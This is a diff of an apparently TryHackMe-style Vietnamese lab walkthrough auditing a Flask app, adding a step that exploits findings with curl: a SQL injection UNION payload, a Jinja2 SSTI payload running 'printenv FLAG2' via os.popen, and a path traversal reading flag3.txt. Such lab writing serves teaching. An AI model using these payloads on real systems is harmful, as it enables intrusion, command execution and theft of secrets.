@@ -79,68 +79,41 @@ $ semgrep --config /opt/review/semgrep-rules .
 
             6┆ SECRET_KEY = "vk_s3cr3t_d0_n0t_sh1p_2026"
 ```
-Các kết quả tìm kiếm bằng grep bao gồm cả nhiễu (các dòng nhập khẩu, các DB_PATHphép nối), đó chính là điểm mấu chốt: một kết quả tìm kiếm bằng grep chỉ là một ứng viên, chứ không phải là một kết quả đã được tìm thấy. Semgrep thu hẹp kết quả xuống còn bốn kết quả quan trọng.
+Các kết quả tìm kiếm bằng grep bao gồm cả nhiễu (các dòng nhập khẩu, các `DB_PATH`phép nối), đó chính là điểm mấu chốt: một kết quả tìm kiếm bằng grep chỉ là một ứng viên, chứ không phải là một kết quả đã được tìm thấy. Semgrep thu hẹp kết quả xuống còn bốn kết quả quan trọng.
 
-Máy này cung cấp Semgrep với một bộ quy tắc có sẵn tại /opt/review/semgrep-rules, vì vậy quá trình quét này chạy ngoại tuyến; nếu có truy cập internet, chúng ta sẽ trỏ --configđến một bộ quy tắc công khai như p/owasp-top-tenthay vào đó. Đọc từng kết quả tìm kiếm trong ngữ cảnh. Danh sách ứng viên sẽ thu hẹp lại thành một truy vấn SQL thô được xây dựng bằng chuỗi f trong trình xử lý tìm kiếm, cùng một trình xử lý đó sẽ phản hồi lại truy vấn thông qua render_template_string, và một trình xử lý tải xuống kết hợp đầu vào của người dùng với send_file.
+Máy này cung cấp Semgrep với một bộ quy tắc có sẵn tại `/opt/review/semgrep-rules`, vì vậy quá trình quét này chạy ngoại tuyến; nếu có truy cập internet, chúng ta sẽ trỏ `--config`đến một bộ quy tắc công khai như `p/owasp-top-ten`thay vào đó. Đọc từng kết quả tìm kiếm trong ngữ cảnh. Danh sách ứng viên sẽ thu hẹp lại thành một truy vấn SQL thô được xây dựng bằng chuỗi f trong trình xử lý tìm kiếm, cùng một trình xử lý đó sẽ phản hồi lại truy vấn thông qua `render_template_string`, và một trình xử lý tải xuống kết hợp đầu vào của người dùng với `send_file`.
 
+## Bước 3: Xác nhận và khai thác
 
+Kiểm tra ba trong số các phát hiện so với phiên bản đang chạy và lấy từng cờ. Chạy các lệnh này từ AttackBox chống lại `http://10.114.141.196:8080`, hoặc từ phiên SSH của chúng ta chống lại `http://localhost:8080`, cả hai đều truy cập được ứng dụng. Các cờ được hiển thị như `THM{...}`trong đầu ra bên dưới; phiên bản đang chạy sẽ in giá trị thực, hãy gửi giá trị đó.
 
+Các tuyến tìm kiếm và tải xuống đang ở phía sau `@login_required`, vì vậy yêu cầu không có phiên sẽ bị trả về trang đăng nhập. Chúng ta đăng nhập một lần bằng `curl`, lưu cookie phiên vào một tệp `jar` và sử dụng lại nó với `-b jar`trong mọi yêu cầu sau này:
 
+```
+$ curl -s -c jar --data "username=analyst&password=vaultkeeper" "http://10.114.141.196:8080/login"
+```
 
+Lỗ hổng SQL injection trong điểm cuối tìm kiếm. Trình xử lý xây dựng truy vấn của nó bằng một chuỗi `f-string`, do đó tham số tìm kiếm có thể bị tấn công. Truy vấn lọc theo người dùng đã đăng nhập, vì vậy nó che giấu dữ liệu chúng ta muốn, nhưng đọc tập lệnh hạt giống ( `init_db.py`) cho thấy lược đồ: một `system_flags`bảng chứa cờ, và truy vấn chọn hai cột. Một truy `UNION`vấn có số lượng cột khớp sẽ lấy cờ ra ngay lập tức. Payload là ' `UNION SELECT flag, flag FROM system_flags-- -`: phần đầu 'đóng `title LIKE '%...`chuỗi mà trình xử lý đang lắp ráp, `UNION SELECT flag`, `flag`thêm một tập kết quả thứ hai có hai cột khớp với `title, secre`truy vấn gốc đã trả về (một truy vấn `UNION`cần có số lượng cột khớp), và phần cuối `-- -`bình luận phần còn lại `%'`để những gì còn lại là SQL hợp lệ:
 
+```
+$ curl -s -b jar --get "http://10.114.141.196:8080/search" --data-urlencode "q=' UNION SELECT flag, flag FROM system_flags-- -" | grep -oE 'THM\{[^}]+\}' | head -1
+THM{...}        # FLAG1, submit this value as the answer
+```
 
+SSTI trong trình xử lý tìm kiếm. Trình xử lý tương tự sẽ phản hồi lại truy vấn của chúng ta thông qua `render_template_string`, vì vậy truy vấn được hiển thị dưới dạng mẫu Jinja2 thay vì hiển thị dưới dạng dữ liệu. Trước tiên, hãy xác nhận việc chèn bằng `{{7*7}}`, sau đó xây dựng tiện ích đã hứa trong Nhiệm vụ 5 từng bước một. `cycler`là một hàm trợ giúp mà Jinja2 luôn hiển thị trong mẫu; `cycler.__init__`là hàm tạo của nó, một hàm Python thông thường; `.__globals__`trên hàm đó là không gian tên toàn cục của mô-đun đã định nghĩa nó, `jinja2.utils`; mô-đun đó nhập os, vì vậy `cycler.__init__.__globals__.os`là osmô-đun được truy cập từ bên trong mẫu; và `.popen('printenv FLAG2').read()`chạy lệnh và trả về đầu ra của nó. Ứng dụng giữ `FLAG2`trong môi trường tiến trình của nó, vì vậy `printenv FLAG2`đọc lại nó:
 
+```
+$ curl -s -b jar --get "http://10.114.141.196:8080/search" --data-urlencode "q={{7*7}}" | grep -oE 'Results for: [0-9]+'
+Results for: 49
+$ curl -s -b jar --get "http://10.114.141.196:8080/search" --data-urlencode "q={{ cycler.__init__.__globals__.os.popen('printenv FLAG2').read() }}" | grep -oE 'THM\{[^}]+\}'
+THM{...}        # FLAG2
+```
 
+Lỗi truy cập thư mục trái phép trong điểm cuối tải xuống. Trình xử lý nối tên tệp của chúng ta vào thư mục tải lên và gọi hàm `send_file`mà không kiểm tra tính hợp lệ. Thoát khỏi thư mục tải lên để đọc `/flag3.txt`:
 
+```
+$ curl -s -b jar "http://10.114.141.196:8080/files/download?file=../../../flag3.txt"
+THM{...}        # FLAG3
+```
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+Hai phát hiện mà chúng tôi chưa khai thác, đó là lỗi kiểm soát truy cập trên điểm cuối của Vault và mã được mã hóa cứng `SECRET_KEY`, đều là có thật và đáng được xác nhận trong ghi chú của chúng tôi. Vaultkeeper cũng không có lỗ hổng chèn lệnh hoặc lỗi giải mã dữ liệu không an toàn; một ứng dụng thực tế hiếm khi chứa tất cả các lớp mà chúng tôi đã nghiên cứu, và việc ghi lại những lớp nào bị thiếu là một phần của quá trình kiểm toán. Một báo cáo đầy đủ sẽ liệt kê mọi phát hiện, không chỉ những phát hiện tạo ra cảnh báo.
